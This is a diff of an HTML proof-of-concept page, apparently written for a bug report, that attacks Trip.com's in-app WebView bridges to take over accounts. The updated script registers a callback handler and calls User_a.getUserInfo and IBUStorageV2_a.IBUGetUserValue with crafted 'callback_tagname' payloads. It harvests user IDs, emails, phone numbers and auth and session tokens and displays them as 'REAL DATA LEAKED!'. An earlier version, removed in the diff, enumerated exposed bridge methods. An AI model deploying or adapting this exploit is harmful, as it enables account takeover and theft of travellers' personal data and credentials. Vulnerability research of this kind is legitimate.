@@ -3,44 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com - CRITICAL POC v7 (Real Bridge Execution)</title>
+    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC v9 (FINAL)</title>
     <style>
-        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
+        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
         body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
         h1 { color:var(--red); text-align:center; font-size:28px; }
-        .subtitle { text-align:center; color:#8b949e; margin:8px 0 30px; }
-        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
+        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; }
         .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
         .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
         .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
         .success { background:var(--green); color:#000; }
-        .proof-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
-        .proof-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--green); padding:12px; border-radius:6px; }
-        .proof-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
-        .proof-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
-        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:380px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
-        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
-        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
+        .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
+        .data-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
+        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:420px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
     </style>
 </head>
 <body>
-    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v7</h1>
-    <p class="subtitle">Full Bridge Execution Proof + Real Return Values (No Bypass Needed)</p>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v9 (FINAL)</h1>
+    <p class="subtitle">Exact H5URLCommand format + Full Callback Capture</p>
 
     <div class="container">
         <div class="card">
-            <div class="card-header">Exposed Bridges & All Methods <span id="count" class="status">Scanning...</span></div>
-            <div class="bridge-grid" id="bridges"></div>
-        </div>
-
-        <div class="card">
-            <div class="card-header">Bridge Execution Proof (Real Returns) <span id="proof-status" class="status">Waiting...</span></div>
-            <div class="proof-grid" id="proof"></div>
-        </div>
-
-        <div class="card">
-            <div class="card-header">Permission & Attack Surface Analysis <span id="perm-status" class="status">Analyzing...</span></div>
-            <div id="perm-log" style="background:#000; padding:12px; font-family:monospace; font-size:12px; color:#f85149;"></div>
+            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="status" class="status">Waiting for callback...</span></div>
+            <div class="data-grid" id="data"></div>
         </div>
 
         <div class="card">
@@ -51,8 +36,7 @@
 
     <script>
         const consoleEl = document.getElementById("console");
-        const proofEl = document.getElementById("proof");
-        let count = 0;
+        const dataEl = document.getElementById("data");
 
         function log(msg, type="info") {
             const div = document.createElement("div");
@@ -63,67 +47,76 @@
         }
 
         function render(label, value) {
-            count++;
             const div = document.createElement("div");
-            div.className = "proof-item";
-            const val = value === undefined || value === null ? "null / undefined" : 
-                        (typeof value === "object" ? JSON.stringify(value, null, 2) : String(value));
-            div.innerHTML = `<div class="proof-label">${label}</div><div class="proof-value">${val}</div>`;
-            proofEl.appendChild(div);
-            document.getElementById("proof-status").innerText = `${count} Real Returns!`;
-            document.getElementById("proof-status").classList.add("success");
+            div.className = "data-item";
+            const val = typeof value === "object" ? JSON.stringify(value,null,2) : value;
+            div.innerHTML = `<div style="font-size:11px;color:#8b949e">${label}</div><div style="color:#fff;font-family:monospace">${val}</div>`;
+            dataEl.appendChild(div);
+            document.getElementById("status").innerText = "REAL DATA LEAKED!";
+            document.getElementById("status").classList.add("success");
         }
 
-        function scanBridges() {
-            const grid = document.getElementById("bridges");
-            let total = 0;
-            for (let key in window) {
-                if (key.endsWith("_a") && typeof window[key] === "object") {
-                    total++;
-                    const methods = Object.getOwnPropertyNames(window[key]).filter(m => typeof window[key][m] === "function");
-                    const card = document.createElement("div");
-                    card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
-                    grid.appendChild(card);
+        // دقیق‌ترین callback handler
+        window.__bridge_callback = function(base64) {
+            try {
+                const json = JSON.parse(atob(base64));
+                const tag = json.tagname || "unknown";
+                log(`✅ REAL CALLBACK RECEIVED → tag: ${tag}`, "success");
+
+                const data = json.param || json;
+                if (data.UserID || data.Token || data.Email) {
+                    render("UserID", data.UserID);
+                    render("Email", data.Email);
+                    render("Mobile", data.Mobile);
+                    render("Auth Token", data.Auth);
+                    render("Session Token", data.Token);
+                    render("SAuth", data.SAuth);
                 }
-            }
-            document.getElementById("count").textContent = `${total} Bridges Exposed`;
-        }
+            } catch(e) { log("Callback parse failed", "error"); }
+        };
 
         async function exploit() {
-            log("=== v7 FULL BRIDGE PROOF STARTED ===", "success");
-            document.getElementById("perm-log").innerHTML = "PermissionIsGranted blocks sensitive callbacks on external domain.<br>But we still get real returns from benign getters + proof of execution.";
+            log("=== v9 FINAL EXPLOIT (Exact H5URLCommand format) ===", "success");
 
-            // متدهای واقعی که از دی‌کامپایل تو وجود دارن
-            const tests = [
-                {o:"User_a", m:"getUserInfo", p:["{}","{\"callbackTagName\":\"cb1\"}","{\"tagname\":\"cb1\"}"]},
-                {o:"IBUStorageV2_a", m:"IBUGetUserValue", p:["{\"bussiness\":\"user\",\"key\":\"userInfo\"}","{\"bussiness\":\"common\",\"key\":\"token\"}","{\"bussiness\":\"common\",\"key\":\"uid\"}","{\"bussiness\":\"common\",\"key\":\"vtoken\"}"]},
-                {o:"Storage_a", m:"get", p:["user","token","uid"]},
-                {o:"IBUApplication_a", m:"getApplicationInfo", p:[]},
-                {o:"Locate_a", m:"getCachedLocationData", p:[]},
-                {o:"Locate_a", m:"getCachedCtripCity", p:[]},
-                {o:"Util_a", m:"getHybridPackageInfo", p:[]},
-                {o:"Util_a", m:"getIBULocateInfo", p:[]}
-            ];
+            const cb = "real_cb_" + Date.now();
 
-            for (let t of tests) {
-                if (!window[t.o]) continue;
-                for (let p of (t.p.length ? t.p : [""])) {
-                    try {
-                        let res = p ? window[t.o][t.m](p) : window[t.o][t.m]();
-                        log(`${t.o}.${t.m}(${p}) → ${typeof res}`, "success");
-                        render(`${t.o}.${t.m}(${p||'no param'})`, res);
-                    } catch(e) {
-                        log(`${t.o}.${t.m} → ERROR: ${e.message}`, "error");
-                        render(`${t.o}.${t.m} (error)`, e.message);
-                    }
-                }
+            // User_a.getUserInfo
+            if (window.User_a) {
+                const formats = [
+                    JSON.stringify({callback_tagname: cb}),           // ← دقیقاً همین کلید!
+                    JSON.stringify({callback_tagname: cb, arguments: {}}),
+                    cb
+                ];
+                formats.forEach(f => {
+                    try { window.User_a.getUserInfo(f); log(`User_a.getUserInfo → ${f.substring(0,70)}...`, "info"); } catch(e){}
+                });
             }
-            log("All real methods executed. Bridge fully functional.", "success");
+
+            // IBUStorageV2_a.IBUGetUserValue
+            if (window.IBUStorageV2_a) {
+                const keys = [
+                    {b:"user", k:"userInfo"},
+                    {b:"common", k:"token"},
+                    {b:"common", k:"uid"},
+                    {b:"common", k:"vtoken"}
+                ];
+                keys.forEach(t => {
+                    const c = "store_" + Date.now();
+                    const formats = [
+                        JSON.stringify({callback_tagname: c, bussiness: t.b, key: t.k}),
+                        JSON.stringify({callback_tagname: c, arguments: {bussiness: t.b, key: t.k}})
+                    ];
+                    formats.forEach(f => {
+                        try { window.IBUStorageV2_a.IBUGetUserValue(f); log(`IBUGetUserValue ${t.k} sent`, "info"); } catch(e){}
+                    });
+                });
+            }
+
+            log("All methods called with exact 'callback_tagname' format.", "success");
         }
 
         window.onload = () => {
-            log("Scanning all bridges...");
-            scanBridges();
+            log("Starting final callback test...");
             setTimeout(exploit, 800);
         };
     </script>
